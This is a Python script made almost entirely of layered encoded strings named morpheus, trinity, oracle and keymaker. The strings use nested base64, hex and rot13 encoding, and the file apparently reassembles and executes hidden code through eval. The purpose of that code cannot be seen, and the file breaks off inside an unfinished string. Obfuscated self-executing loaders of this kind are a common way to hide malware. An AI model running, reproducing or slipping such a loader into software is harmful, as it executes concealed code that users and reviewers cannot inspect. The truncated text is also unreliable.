import base64, codecs

morpheus = 'aW1wb3J0IGJhc2U2NCwgemxpYiwgY29kZWNzLCBiaW5hc2NpaSwgc2l4Cgptb3JwaGV1cyA9ICc2NTRhNzk3NDU3NmM3NTUwNmYzMDY5NTc2NjcxMzk2NjMwNTczODMxNmY3ODMyNzQ3NTRlNjczNTYxNTc2YzZlNzA1ODQzNDM0OTU0NDM0MjQ1Nzc0ZTMyNDU3NTZmNTg2YjZlNTM1MzM1NmQ0YjQ0MzIzMDM0NDQ3NjMzMzYyZjQ1MzI1MjU2NjQ2MTM5NDcyYjM3NTE3MTU3NTM1MjQ1Nzg0OTZjN2E1MDJiNjMzNzMzNjM2NTZkNTA1NjJiNzU3NjM3MzE2ZDY2Nzg3NzY1NWE3NjJmMzQ0YzU0MmIyZjQ4NjY0OTJmNzY2ZTMxNzI3YTcwNjYzMjM0MzM0NDM3MzQzNzY0MmYyZjY2NTkzOTMyMmI3NjMzNTYzOTUwNTQ3NTRmNGUzOTM1NDU1YTY5NDI0NTJmMzMzNDc0NDQzMDYyNTg3MTM4NDYzNjZkNzg3MTRmNTEyYjQ3NTAzMjZlMzU1NDQ4NjI3YTM3NDU2NTc0NDY2YzMwNGMzMzRiNmE2ZTZhMzA1NjM3NTI1ODZlMzc3MDZkN2EzMDJmNGY0MjRjNjY2NzU0NTY3NTUwNzQ1MjdhNDI1NzVhNmQ0MTZjNWE3NTQ0Njc0NjMyMmI2MjZmNDU2YzQ4NTk2MTU4MzQ1Nzc4Njg0MjZkNjY2MTY5MzQ1NzVhNTEzNDZkMzg0ODc2Nzg2YTc2NDkzOTRkMzM3MzY0NDM0NDRmNDIyZjQ2NDc0MjcxNDI1OTY1NzU0MjQyNTQ3MDZjNGQ2ZjZmNzk0ODM0NGY3OTMwNDU1MTRkMzI2YjM1NmY2MjcxNzg2YjQ0NDc0YjYyMzY0NjYxNDI3ODU4NDUyYjMxNDU0NDUwNDM0NTYyNzczMzY1NDMzNzRhNTc2MjM0NDcyZjUyNzk0NDY2NTMzMTZhNWE1NTRmNjQ0ZDM4NmQ0NDZiNjY1MjcwNGM2ODY2NDg3MzU2NTk2NzU2MzQ3OTQzMzA3MDc1NDM2Nzc0NTAzNDY3MmYyZjY3NzQ0YzU3NTI0MzZiMzA2ZjcwMmY0NzUxNzM0ZDMzNTEzNTU0NzA1MDRlNmE1NDM5Nzg0NDMzNjM2ODMwMzg2NzU0Mzc2Zjc4NGM0YzQ3NTg1MzUwNzU2ZDZmNDgyYjZiNGE2MjY3NzIzNjdhNDE2ZTM5NjQ0ZDJiMzczMDZhMmI0ZTRhNmI3NjQzMzE3ODc4Njc2OTczMmY0MjM2NGQ3NzY3NTI2NjRkMzk3OTUwMzIzMTRjNzc2ZTU3NGIyZjc1NGY0ZTY1NmU2NjUxNjg1Mjc1NmE0NjU1NzU3NTY3NDI1NDcwNmE0Mzc2Mzc3OTY1NTI0MTU4MzQ0MzMwNWE2YzQ2MzU2YTMwNTk0ZDJiMzA1YTc1NDQ2NjM1NGE3NjQ0NDI3MDc3NDc2ZDJiNTA2NzU3NGU3MjMwNGIzOTQyMmI2ODU4NDU0NzJiNmI1NDY1Njg1NzZhNDQ1NDMwNmQ2YjQzNjU2NjJiNDM2NzQ2MzE3NTU1NDgzNjUyNmY2ZTM2NTQzNzZmNGIzODQ2NTQ0NTRjMmIzMTczNmY2NDQ2NzQ3MjQ2MzEzNjQ4Mzk0ZjY2NDc3ODY5NTc1MjQ1MzkyZjQxMzEzNzRhNTQ3MjVhNDQ2MjRiNDQ2NjZlMzU1ODM5NDM0NTU4Mzc0NDUxMzkzOTM1NDI2ZTQ0NDg0NzRmNjc1OTYxNTk2YjM1N2E1OTYyMzQ3MTc4MzA0YjQ2MzM3OTQ1NDYzODYyNmI3Njc3NGQzMDRiNDg0NzcyMzM0NDQxNjg3MjczNzE1OTRlNzY2ZTRkNGQyYjZiNmEzODZkNzUzODQ3NDg3OTZjNTE2YTY1MzQ0MTY1MzY0ZjM0MmI2ZjQxMzk2YTU5MmI1NzUxNGE3YTU1NmIyYjVhNTM1NjY3NzQyYjZiNjgzODJiNTI0NDM4NDc2NTM0NTE2NzM5NDQzNjUxNmU2ZTQ5NTAzOTUzNTYyYjY3MzUzMzQzNjM2Nzc4MmI0ZDQyNjQ2YzMyNjc0ZjM5NDE2Njc1Njc1MDMzMzA1NzczNjU0NDQ1NmIzNjRkNDE0ZjY3Nzk1NDY2NjcyZjMyNTU3NjUyNzM2MjMzMzg0ZDQyNzU3MzRlNWEyYjRhMzA1NDY3NzA2MzU1NTAyZjRiNTY1NTQzNjYzOTQyNDQ0ODM4MzA2OTQ5NWE2YjMzNmM2NzQ2NTg1MTY1MzMzNDZiNjU3MjUzNjM2YTM3NGI1MTcyNzYzNzY1Njc0NjJmNjc3MDJiNGI0ZDZlMmI0ZTcwNTc3OTZiMmI3MzZlNGQzNjUzNjYzODJmNDI0NDJmNjc1ODM1NDY2MzQ3MmY0ZjZmNGY0ZjMyNDE2Njc2Njg3MzMyMmI0OTU4MmI2ZjRjNGUzMDY4NGMzMTRhNjQ3ODYyMzU1OTY3NGIzNTU5NDEyYjZjNTkzMTZjNDMzMzJiNDQ2Mjc3N2E3MTMwNTc2OTZmMzU3MzUxMzk3ODRkNzQ0YzdhNDQ2NjcxN2E3NzU5MmI1MzQ2MzAyZjM0NDE2ZTMwNzY0NTJmNDkzOTc5NDU1Mjc4NTY1NTQ3NTA3MDRiNjM1MTJmNmI0MjJiNDM3YTMyNTgzNjUxN2EzMDc5NTIyYjQ3NmY0ZDdhNGE1NDc4NDQ2ZTMwNDUyYjYzNTEzMTJmNzc0ZDU0NzE0YzQ3NGE1NTZjMzQ2ODMxNzg0OTcwNTMyZjcwNzQ2ZjZkNDI2ODM4NmEzMzU5NjMzNDc3NmE2NTczNmMzNDQ1NDY2NTM4NjU2ODY5NmM1MDZmNmUyZjYyNjg3NTJmN2E0MTJmNTg3MTY3MmI0ZjRiNzczNjM3NTk2ODc2NTk2NzM0Njg0Njc3NGQyYjcxNTY2ZTQxNTYzNjMzMzg0Njc1NjIzNDY4MzM3OTQ2NGI1MzY2NTE2NDZkN2E0YTQ4NzA0ZDM4NTI0MTMwNzM0YTMyNTY3NzdhMmY2ODZhMzI0ZjRmNTA0MjUxNjk1MDczNDY1MDU4NDc0MjY0NGU2YjRjNDY0YzJmNTE0YzMzMzQ0OTY0NTQ0YzRhMmY1NzZmNjE0NDczNmY1MDUzNTczNjZhNjk0MTUwNzA0MjU4NGE0MjJmNzA0YTUyNTA0NTQ1Mzg1NjM3NGE0YTUzNmU0ZTQyMmI2ZTY1NDk1NTJmNGQzMjZlNjY0MTQ4MzU0ODRkNTQ0YzQzNDQzODZhNzUzNTUxNzA1YTRiNDYzMTc5NDI1NTZlNmM0NjY0MzAzODQ1NDgyYjMwNDY0ZTYzNzA0ZDUyNzY1NDQ4MzY1OTQ0NDY1MDJiNzc0NDM3NmY0ZDYxNTYzODYxNTM0NTJmNmE1YTUyNjY0NTc2NDM2MjQ5NDYzNDU0NGM1MzMxNGEzMzM3NjczMzQ0NmIzMjc5NjU1NTcwNzgzNjVhNDI2NTUzNTIyZjM0NTIzMzM2NDY2NjUyNTM2ZTQ2NDY2MzYyNDY1MjYzMzQ2MjJiNTU0Nzc4NTg0ZTRiMzg2YzZmNTU0NDM0Njc1MDcxMzQ0MzYzNTM3MDJiNDcyYjc1MzY1MTQ4NjM2YjQ4Nzc0MzUwNTI0MTVhMzg0Mjc4NTY3MzU0Nzc3MzM5NTM3OTcyNzM2MTc5NTk3NjM5NDY1MDY1NTE1MDM4NjMzOTZmNjY2ZDU2NDgzMTU2MmI2ODY4MmI1MjUwNjM0MTUwNzg1MTc0Mzg0YzYzNTkzNTMyNDI2ZTc5NGI2Yzc2Njg3N'
trinity =  'wD1AzHmZmL3AzZlMwMvATV2ZwD5ZmplMwD0AzD2MQWzAQx1AwZ0AmD2LwMuAmLmBQEwAmH1ZmMvZmHmZmp1Awp2ZmMzZmx3AGExZzL2BGHlAQRlMwp4AGR3LGH3AQR2ZwD2AwR1ZwH4AzH3AGpkATVmZwMxAwZmZQD0AmV2LwHmAzD0ZwWzZmH0BQZlAmR0AGp3Zmp0AwEwAwL2MQp2AwV2ZGMuZmL2AmEuAmx2ZmH0AzR2MGHjAGH0LmEuAGV0LmL4AzH2LmExAGL0ZmZ1AzH1ZQHlAGLmZQD4ATH0AmL0AGp0AmMuZmx2MGWzZmH1ZGZjA2RmZGDmAGtmAwp1ZzV0MQL0AJRmAGD2ZmZ3BGEzZzL0ZGDlAGN2BGMyZzL1AwWzAzL2LwH4ZmD2LGZ3Awx0AGWzATV2AmZ1AGVlMwMzATDmBQp4AGL0BQZ0AmL3ZGHlZmp0AGp0AzV1LGZ1AQL2AwL0Awx1ZQZ5AGHlLwpkAwp0Mwp3AwZ3AmMxZzL0LwDmAGt2LmD1AwZ2MwIuAGZ3ZmZ4AwV3ZGL4ATH0MwHmAmL0AwMxAzV3ZmZ5AmH2BGD0ZzL2LwD2ZmV1AwD4AQL1AGWvAzL0AGZkAJR0AwL1AwV3AGMvAmH0AGLkAwD2AmIuZzL1ZmH4AmL0BGMuAwt3ZwL4ZmplLwZ1AzR3BGEvZzV3BGMzZmL2BGL2ZmN0MwEuATZ0MGD1AQLlMwp3AQZmAwMyAzVmAQLmAwp0BQL5AQtlLwpkAzZ1AwHlZzL0AwH4ZmZmAGWzAwD3AwZkAwZ2LGp3AwD3Zwp3ATHmAwL3AwDlLwWvAzR3Amp3AwH3BGDlAmN3ZQpmATH0ZGZmAzD2AQEyAGp3Zmp0AzZ3ZGpmAzH0AwEwZmR2LmL5ZmL2ZwHjAQR3AQpjAQt2ZmZ1AGxmBQZ3ATL3AmHjAwZmAGZ5AzR2ZwpmAwV2MQD3ZzL1LGLlWjc0pzyhnKE5VQ0tVPqKA3MgJxcgM1beoxuwIGAGq2L2X2cPpzykFwt1ZRcUAay1oGSdZyAbqHkOo2x3AKqKZUOjA0g5nKESp3WIIxWYDGMBZPf2EmWlqHAiJHEiGH11FwqLnzIYZ0uIDH5BJH1enKS4E0A5HwWcqQOZDKA0Z3cTDz1iAUW5MSqJpScjEaAeHmELZ2tlX2c1MmyZpQyXrQN4AHj0ASqQZ0SPZUWPAP9jFQMYIaW2Ev9JZ3S0oT80Hzcno3RiMHM4E0uip0fjGGW0D1qeXmq0FwxmnKyxET8lo0IgDKywGSp3rzq2GGMgZHMBoKSIIwSmJRtmoSWmBSEGM0pmL0yjITuRLJuSnQWhrFf2GIpep2fjIQqyIyyGA3quIzAGnHk5A3p2E1LkBKOSrJkjETE1nv83BJuOJKy4GKcnqQAcEmx3o21TZxDkFKMAEaZ3Zl94G1DiLJ9AXmIYMmWjF243Z08mH2j5JKSAAGRmpz0kAKWbZJS6Y2uMDJEfF29yEvgPDJgjI2S4qIDmAHj2pIH2M1ZjZUE6BKbmnUS2GSA5ZUuMIHWPAPf5nISUA21TrKugLJSJLH1PZmEDY0R1MGAkBTyloJtkBKSJLGI2owS6px9yY2knMKSAERqlLytiD1ynIJcfJz1vAxAHpTjlZyMaDxAyraOGMSZiJyAgqTWOM2MJDxynF0S5EJEuJJ8eLH04AQSWY1E3IzMEX3OZoGDiqmRkY0IypUuuBF9uoaOOF1Z2YmMzD2D4p3qGZ2qlFRywpPgIo096F3c5qRyeM2SnZmtiAwIaFJuJnPg4EKOlJGReMzSmp0V1ITIVHIcgp0L4EJ5WZ3ACD0ZeMz5Dn1I6nx9PHyWiZzMZMmydq0uVqx9cA0E6paIuZ0x2E3Wwp1qAHaH4nKOPAJ9TFIIuLmEiFR05DGyznycGq0ReIQWSp0IDZJyEGIHjEJ1lZz5unQEAGKACBJHmHzHkpaAeERR0pwR0rwV2oxR5EJucIJkcnTcUpwWdBJ1yZaAcI1ySAwMno2Ean2SkE2ucozp5ER1RpzEeoyyAL3ImX241XmIaZ004rx1EATSWnFgvoQSzn3yyHUWuo1M1qUpmp2AWpP9ap0IDX1cAoHWiM3x0MQuVLGqKFQEUrKACIwRiBHqEn21inwEkBUSTIlgkJJReFGE6A1OBJz1yMGEXrJuPY0MDBHbeET9mMxyHFKq3Zmqurayznv80oJH1omHiMSxkL2uYp2Ehp2yknQMbA0ALEQqlA0qEoyZjD0pmrQuiryufZ2kYFQN4LISJISEiL0ESLxWep1Z0BTReD1AfnzHmnzSZZmAenRWmHJp4LIWkBGuPnSOuGQSCL1WhLJMAHv92Hz1Pp0b5Y3tjo2fmqQDmZGOIDxWnFGygF0clMIOKDxAaMTSHqzMGZlg4HQuXHGSaoQSgo3MbGKSPLIAzAKSXM2VerJteBUSvZKMKExABZyViHUMcIaSOBHgQp212A3WZMJpjMQuenR9uHzk2nJWfpKbeM0yyn05coPgknJImAIWOFxf5FmL5Aztlq1OJFTxkMP9BHyLirHWjMKy2oIAIDJD5ZzDinQS5qwqQFFgiX2cgJJM4DzxlA29LZwAWFRAbBRp1JaSYZx8eAIAnXmMdZ0quoGH3o1E5oTqaov9MDmE2EQxipz9ynaSInUukDxM6X1EhX29LJHkYDISOZ3piqyIyE1MSD2t2AHS6DGVlY1cKLJZkLIt0oJHkZHgxoQVlX0SKMQH1DwqxD01EpwAeDH42nQyPoGAyMFgGE1L4IQZ0nQWaq1WZnIEGJGWOZPgeZ291BGIGA1OmpaIGnxggJJt3pztlZvgSIwIiDxkup3SnD1D5AQSiAQL2JSp5AJ9fIIxeoHA4Mx9vp2yHAHknIGMgLGMjFKSIDKq0oJj3o09XJSy1pGVlMTtkGRf3MTIeFIcYBGMWZ2xlLwtmITgQMQuLn1EgM2I3GTIApKAaoRScpQZmAaMHF251pGx0ZzMLH3AMJRujq2AfIGAJo25FZQSMDwSPEURlowuKrSOcZ0yHJwOlrxSOomSEpx1XH2xeD3V5oTWYIzqdZJknDHuBA0S0GHL4p0MVFPgRJzjmETxkJUSREmqaAxkuoaEmF0ESEQOJBRASn3qgE3uuF1t0qKSvrUW1owqWJJMnDaV1nyZiIabkETSVHxqhMQAInTScIz1jEl94o0p2LzAcEwMwBJqen0HlD3AdJQubAlf0Jwx1rvgvBGISnwMfnIIJAmqcEwR0L0SvH3WSoHubGIAxL1ScFJcRomSfEyIAFSMaISOULzpjE0yVHHkGX3IFDJkYIHyWZQuELGO1IUAWI0ABEwOYnFpXo3WuL2kyVQ0tWmMzAQplLwL3ZmH2MwDkATLmAGDkAQxlMwEzAQHmBGZ2ATH0MQHkAwD0MGH5AmD3ZGEvAmZ2LwH4Zmx3AGLlAGZ2ZmLkAzH2MQL3AQLmAwD4AzD2BQH5ZmN2LwDkZzL2MGH1AQt3AQD0Amx0MGEyAQx2MGD1AGN3AQLmAzD0ZGHjAmR2LwH3AwpmAQZ2AmDmBGH2Zmt2LGIuAzL2MQIuAwD2AQIuZzLmZQZ2Amp0AQZkZmZ2ZGMyZmV2Awp2ZmxmZwp2AzD1ZwZ1AwL2ZGDmZmH1ZGD1AQH2MwD1AzD2Amp5AmN2ZGZ2AQZmZQEwAQp2BQp1AzZ1ZwZjAQx1BGH0AQZ0ZwEvAQHmZwZkAGpmZwL4AGp3AmH2AQZ2MwZ2ZmDmAGpjAwRmAmIuAQx1AwH0ZzV2BQH3ZmH2BGL4AwL0LGpjAzR1AwD0ZzV2BQD5AQx0BGp4Aw'
oracle = 'M1ODU1MzI1MjRhNzE1MjUyNjU2Zjc1NmE3NTYzNGQzNDQzNjE1NjY0NjQ2NDM2NDI0ZjM2NzI1MTZhMzkzNjYxNzA2MjczNTM1MjUxNjE1OTcwNzU0NDMxMzE3ODUzNTU2NzQ0NTg1MjQzNjg1NDU1NzM3MTZjNDk2OTRmNjEzMDM3NjQ0OTYyNzEzOTY1Mzk0MTUxNjU2YjY5NmYzNjdhNTU1NjY5NzE0Yzc1NGU0NTYxNTg0ZjUyNDk0MzQ5NzY2ZjMyNzU2YTM1Nzg0YTM1NTM0NTM3NzY3ODQ5NGI0MjZhNjQ0ZjMyNTE3MTQzNTA1NzZhNTMzNjU1NzA0MTc2NjI0NjM5NmM2NTU4NjI3ODRkMzY2ZTc0NGUzMDQ5NDMzMDRhMzY1MjQ3NjE0YTcyNmQ0MjY1NmI3MjcxNzI2ZjQzNTc3MTRiNGUzMDYyNDg1MDcxMzA2ZjQyNjk1OTZiNGMzMTc4NDQ2NTM2NTMzMzUzMmY1NTZlNTg2ZTMxNDczMTM1NTE0MjJmNmY3NDZkNmU0YjRkNjQ0YjM1NTI0MzQ2NGE1MTY4Mzg1NDQ3NmI1NTZlNGY1NjYxNjE1MTZmMzk2YzUxNTYzMDYxNmY1NzQ2Mzg2YzM0NTI0YjQzNGUzMTU2Njg0ODU5NTY2NjU5NTY3MTMwNGY0NTUyNTQ3YTUzNmM2MTQ1NGI0NDcwNjk0ZjcxNjUzMTUyNTA2ZjQxNTQ3MTUzNjczMzQ5NTMyZjY2NTI1MjQ5NTMzNjc3MzQ1YTUxNGE3MjcyNDc2YjcyNzIzNjZjNGU0MTc0NjQ2NDU3N2E0MzY2NDg0MjZhNmE1MjQ2NmY0NzM2NTg1NTQzMzczMDZhNzUzNTdhNTE2NzRmNTE2MTJmNDk0NDM0NjczMzc5NGUzNDZkNzU3MDY5NTU2YzU1NDEzMTM0NzA3NzM1NjQ0YjcyNTI0MzMwNzg1NjQzNTE1MjU4NzQzNzY0NTY1NTVhNTM1NDY1Nzk2MjM0NGE2NDY2NDUzMDM5NTY0NDMzNDIzNDUzNTc2NzQ5NmY1NjQzNzE0Nzc1NmQ0ZTQzMzQ2ZDczNDM2ZjY5NTk3OTZkNzA2ODU2NzE2NTY3NDQzNjY4NGY0YTcwNDM3NTQ3NTE1MDczNDc1ODZmMzk0MTRkNTQ1ODMwNmQ0ODUxNDQ0ZTUzNDU0YzRhMzg0ZDY1NTUzMDQ0NmEzODQ0NzE2ODUxNTQ1YTRkNmQzMTQ1MzQ2ZjQ0MzczNjMyNGEzMzMzNmIzMDJmMzA0YjcyNjQ0NDM5NGU0NzU1NDI3NTY5NjQzNzc4NmE1NDU2NDk1YTM5NTMzOTc1Nzg3MDc1NzE0YzUxNTE0MzZjNGQ1YTUxMmI3OTQ3NjE0NzQ2NmI2NTY3NTI2ZDZjNTI1NDQ5NjQ3ODQ4NTA2OTYzNmQ1ODY0NDc1NTc3NzE0NTRhNDE2NDQxNTkyYjRiNjM3MDc5NTk1NDY5NTE0OTc1NmQ1NTRkNmYyYjQ0NDQ3MjQ0NjQyYjcyNTc2MzYyMmY3OTRkMzA0YjRmNGU0YzMyNDI3MjM1NGY2MzQxNjU2ZDZhNTM1NzQ2NmU1MDQyNTY3MTUyNGU2NDUwMzY0MjM0NmY0Mzc0MzIyYjcxNjE1OTc3NDQ2YjMxMzc2MTRjNGI0NjY1NDM2NzRhNmE2MTcwNzA0MjZiMzE2YzYxNDE0YTQyNDU3ODczMzE3YTYzNGI2NDczNDEzOTRlNDI2NzU0Mzg2ODRiNWE0NDZhNGU0NDUyNTE0ODVhNGQzMTU0NTM0ODZhNTY1MDYzNDU2NTZmNDY2NTZjNWEyYjRkNmIzMDUwNGE0ZjZkNmI0YTQ4NTE0YjJiMzA0YTJmNjc3MDQxNDY2ZjYxNDM1MjJmNDY1MDQ2NmIzNjQ5NDQ3NjY5NDI2ODRmNGY2ZDUyNzA2YjUzNmE2ZDcyNzA2ZjZiMzMzMDQ2MmI1OTZkNmQzOTQ1NmE3ODMyNDM1MTZiNmMzMDM1Nzg1NDM5NGQ2NzZmNDQyZjU5NDQyZjVhNTY1NTc5Njk2MTRiNjg0MjRiNDM3NTY2NmI0ZjM2NTM2ZTcyMmI2YjQ5NmY1MjcxNzM2ODMyNzA0YjQ1NzA0MzY1NGI0ZDJiNTE2NjM1NGY2NTMxNTU1MTQ3NzE0OTM2NmQ0OTc5NTEyZjM1NTM3NTYxNDg2ZjMyNmI3Mjc3NzA2ZjQ0NjU2ODc1Mzg3MDY2NWE0ZTUwNTY1MjY0NDM0MTQ4MzY1YTM5NTE2ZDRhNzI0NzQ3NTE3MTU2NzE2NTZiNDIzNTRiNDE0YTZhNmY3MDU0Mzg2ZTY1NjE1Mjc0NDg0NTY4NGY0YjQzMzU0NTZjNzA3OTZiNTQ2NjUyMzU1NTQ4NDU0ODRlNzE0ZjcxNjI2ZjM1NjM3Mjc1NjE2ZjZmNzg3MTc1NmI0ZTZmNjMzMTY4Mzg2ODRlNDM2Mjc3NGMzODZiNDQzMDQ5NWE1NTRlNzU3OTcyNGQzMDcyNTc2ZTUzNGI2NDJmNTE3NDQ5NTAzODZlMzk0MTZmMzY1OTU3NmQ0ZDY5NmY0ODQxNDE1NzU3NmM0NTJiNTQ2MTU2NmYzNTMyNzQ0MTU0NTQ1MTMzNTY0ZTQ4NGY2YjQ4NDE0YTM5MzY2NDUwMzA2YzY1MzY2OTc5NTk1ODY5NmQzOTQ0MzY2YTQzNjE3YTMwNzg1MzUzNzA2YTQ1NGI2ZTYzNGEzMzRiNDIyZjUxNmM0MTM4NmY2ZDY2Nzg0MTM2NWEzMTUwNTUzNDU5MzkzMDUzNjMzNjQ2NDYyZjQ5NzUyYjUyNGM1NTM4MzU0NjJmNDY0NTYzNzc0ZTM1NmI1NDJmNDM2ZTMwNDQzMzc1NDE3NDZmNmMyZjY3N2E0YjZiN2E1MTc0NDU0OTUzNGI0YzU0NTgzOTRlNDY1MTJiNDk2MjM4NjkzMzc5NWEyZjYyNDM2YTZlNTU2ZTM1NTYzOTY5NTQ2NTMxNTI1MzRmMzg3MDRhNTU3NTUxMzczMDU2NGEzNjZjMzY1MjQ0Njk2YjUzNWEzNDM1NGIzOTQxMzIzOTRlNTU2Yzc2NDkzODJiNDI3MTcyNzE2NjM2NTU0ZTQ4MzE1NzU1MzE2NjQ5NDQ0YzM2NTU1ODJiNTUyZjM5NDQyYjUzNDQ2ZDQ1NjY1ODY2NmI0MjU0NjUzNDZmNmEzOTQ1MzA2YjRkMzQ2ODZhMzAzNTM2Njg2NjM4NmE2Njc5NmMzNzU3N2E1NDMxNTU2NjYyNTU1NjQ2Nzg2MTQyNjY2YjU0NTQ2MjU4MzE0YjUzMzg2YjZkNzA3MTJiNmE1NDUyNTY2ZjY0Nzk1MDc2NDI0NjQ0N2EzMjZmNzE0MTM3Mzc2NzMzMzU0YjZkNDE0NTMxNDM2NTUyNjIzMjcwNWE3MDQzNjQ3NTRiNTU1ODM4NjcyYjY5NGQ0ZjZiMzkyYjM3NzQ1MjYyMzc1NTMxMzM1MjJmNzI2NjRkNmE1NDY0NTA2NjcyNGMzMTY0MzY0OTY2Mzk2YTY3NjM3NjZiNjc2NjRhNDY1NjU1N2E0MjJmNGI1MjM2NTc3Njc5NTU2NTY2MzEzMjM1NGQzMDUwNDY0MjU5NGY2MjQ3NmE0Yzc5NGQ2YTM2NDQ2MTcyMmI3NjY5NjEzOTQ4MzU3MTMxNDUyZjZmNDI1MDc4NjczNzdhNTY1MjMwNzM2ZjY3NDM1YTM2NDQ1NjUyMzM0ODc1Mzk1YTM0NjQ1OTQ5MmI0ZjY5MzE1MDM4NTczNTMzNmI1NTZlMzY2ZDYzNjM3MjU4NTI3NzU4MzE2Yzc'
keymaker = 'mAzR3ZQL0AQZmZwEwZzLmAGp3AQL2AQD4ZzV3AmZjZzVlLwL2ZmL3ZmEzAGRmAGEyAGL2BQp3AmZmZGDkZmtmAQMxAzZ2ZmZ3ATH3AQHkZmZ0LmLkAGN1BQZ5AQHmZmL0AwV1BQL1AzR0AQMxZmx2AQLlAmZmAGExAQt0MGD4AmxlMwZ5AwHmAGZ2AwR0BQMuAGp1AwZlAwL1ZQZ1AmD0LmD5AmZmZmHjAwZ1Awp5Amt2LGquATDlMwLkAwplLwL2Amp3ZQp0AGtmAwZlAGR2MQMzZmRmZmH3AmV3AGL4ZmZ3BGZlZmN3ZwZmAGD2ZwWzAGt2AmEvZmLmAwquAGV2LwL0AmxmBQpjZmp2ZwH1Zmp2ZwMzAwt2AwZ5AQx3BQD0AmN0BQMvAwp3ZmHjZmHmZmL5Zmp2BGZ1AwZ2AwL0ATH0AmZ0AzHaPzgyrJ1un2IlVQ0tW29wBGSYMKMQq3uErHyhHmN4LHpeEJq5ITt4qaR1HyL5JHqaMTu4pxplBUcLI1OEG3yXZQIkGxIDBJM3HSylHHAlZQuRBURmX0EuETf5MaR1H1ykZIEJoIWjF0Z3oURkMKDirRqPIJpmJwqILwIfIHbmDv9lZwySpl9vqKAgZGqPnxWcMxSmp1HjE0W5rRuknIEyA2RjFx1lp0kiXmL2qTkgqv9Xn2WUGJMepIqlA1EkG2b0oRxln2IZqxcyMJ5vFQSbDJkBZ25Xryy6FT02px1lnyLmJyDkI3WbF2D3rJ1MMJ9RIUV5A2I4MzMzn2ueGJkbDyEmpJ1mFyDmDIyGIP9OnT0lpHARZvggoSq6LIH4BUI4DvflLIpjX3LiMIWYZaSzMyp5M1IcH21KL2ZlnHfioUSmp1MCnGH4IRg3ryD1MIq3IzAgn21lGau4AzAhFKSXA2f1rJ04pRgmFF9fGJR5MGAXJKAOrIICM1ucryqnqyMvGP9PrTynoISdAJkcElglAQO1ozR0Y0yxrGqZoQE2AH5aZJkCZxL5pTWULzgxAHW6YmAipUyaBJMOITuXnGS6EyL5GJyPrHSaMmAio1ccIGugqQAMFwx0rHunZ2xiG0SbDzIGAJMXFTu3BRV3AwEXZ3OSoyAGZF9CETD4oH1gLKReD0t5Ax0kAGuWrIIVFJq5Lvgyo0kkX0WMI0ckoJq1ov9IFRSAMxEup3ujZ25aqKVirzEIozqzDHEyp3H0GHcXnGqwq2Wao2p5AmEUGmybo0M0DmAJq0cgnJAXJHSlA0kdLyc5nTD3AQuuM01zG3Ago2SwozkDozWUFzuHL09WHJ9Sp0cSrGuPpGqOL3O4AQNeoT9HZ0kcETSPG2gboz9gMJSXGGVkqGWcFKMinUyiZTcOMQETo1yyJTcEYmWMIIcuE3AlLGynIQAcnKc1H3AbLHk5M1cHZ3cbq0p4nmquA0gvZmygrzyWnz4mX1IhX0gJowV3MJyvBH5jpzSvZJEmAUc1ZQWSA3SMD0f0BJSwpaLioSR2LIqiATgcHF9ZESIEM0g6JJglDIcaIxSbZRcPFyN5nGAGZ0bmMJHloQNkAKqzZmV2I1IBH2WOZaSKDKWIqJkvBJuxZaNkEmAZGJyhMHZlX29InQEzF2fmITcLAKIiGyuipTRjo08mLmqurJ5mZQEYZ2IhBUAUBUWGnxSRJSqPBGIHoyyIBTflAycdnTudpQq0Y2qhrIDlZaqdAGLio1EEMHgGnJMdp0qaA3MRAyABnH1xn01aBKW0HGqXoUSWrRuUFxqUGRHmZxcEp3HiGaWyZPgyoKSDDGOmnIyjAUAco0kOBJgwJHqbEJylBJcPBIbmLaZeGQxkFQpjMJuyAxWkZGOnBIb1LxghDGS2F3R1Ll9OXl9ADaWPnQyYozZmATuaDFgmYmI3F0t3ZUMAAUIhDmxjLJp3DH1VE2SmXmSuAzH0Gmp3nR0lMP9XG00lnIAmZ2WyX3Oup2uuBUqzA0gfZHciAmH3p2HiHJ0lY2R1raIFDJgADaL0FzLiGHyZBSuwLJI2EaZ3GmtkY2tmX0LeGKOPZypkASAnJzyupIx1FJyIqQL3EF90Y3AbBKuaIGEzplgmBUA3rGx2Ix13nGqeEHZipRcAoz8iqRAQFTcfpxWLFmAhIaAkL2xjBJH5AKyEYmR1Dl9fGwqXnP9nHGt1EUZeA1OkBGITp3LirztiX1OuqmuxBGW6paEyLHt3A1p1ZTAPBQpmpHf5BJEmY2M2n1cQoTImX2p5ARy3ZFfeIUZmETciY3RiBRgEEmR4ZIqgZ29QZ21SBSMjpmIeFxAOp3cPFIx2Zytlrv8iZIcIJTWhFT84LmquAmSZX3OSMJ1JA2R5Exjinlf3MH1hn2jiZ0AlHQN5BJD4Fz5OEwueBTIuqIEbnmIEMxIcMT1XG2yYYmWcEl9ApRkRpwuwpHy6EmO5E1EcIGEVJwOzoTf5A2WAJJ1PXmN5LJ05ZGpeX3AenRZ1n1bkGzHiZl9gEFf3nl9lBR1gBGAwMwMmnT8momMmHIEZnSIgAz0eIQAZBTyIZ2qdJwHiozy3A1WiBQHiMT5mX0ganJ5OYl8iM2piY0SwnRqaMaAAM1blpaymo1SuYmx5nUN5n2uQHaEHI3c0pGy1pzEwnKWCLwIYGRViMwLiZGxlrxAzp3qyZHx5pRAbqKAWX0IFY2xeH2t0p0gMAyWYF2cyEF8iE0S6JKp3nGq3BTA1q1MgZQR3MH45Y3biASI3nGx4p012BIIlqF80nKqiEl9ZDxgfoQumYl83Zl8inl9iYlgvDlghFP9gZmxmBGuQY0MIIHReXl9RX2qjHT9eWjc6nJ9hVQ0tW1k4AmWprQMzKUt3ASk4ZmSprQZmWjchMJ8tCFOyqzSfXPqprQpmKUt2BIk4AmuprQWyKUt2AIk4AzIprQpmKUt3AIk4AmWprQL1KUt1Myk4AmAprQp0KUt3Zyk4ZwuprQLlKUt2BIk4AzIprQLkKUt3Z1k4AwAprQL5KUt2BIk4ZzIprQp1KUt2MIk4AwuprQL1KUt3BSk4AzAprQL5KUt2Ayk4AmyprQV4KUt2MSk4AzMprQplKUt3ZSk4AwuprQL1KUt3AIk4AmAprQV5KUtlBFpcVPftMKMuoPtaKUt2Z1k4AzMprQL0KUt2AIk4AwAprQpmKUtlMIk4AwEprQL1KUt2Z1k4AzMprQL0KUt2AIk4ZwuprQp0KUt3Zyk4AwyprQMyKUt2BIk4AmEprQp5KUtlL1k4ZwOprQquKUt2BIk4AzMprQMyKUtlBFpcVPftMKMuoPtaKUt3Z1k4AwyprQp4KUtlMIk4AwIprQMyKUt3Z1k4AmIprQplKUt2AIk4AJMprQpmKUt3ASk4AmWprQV4KUt2Zyk4AwyprQMyKUt2ZIk4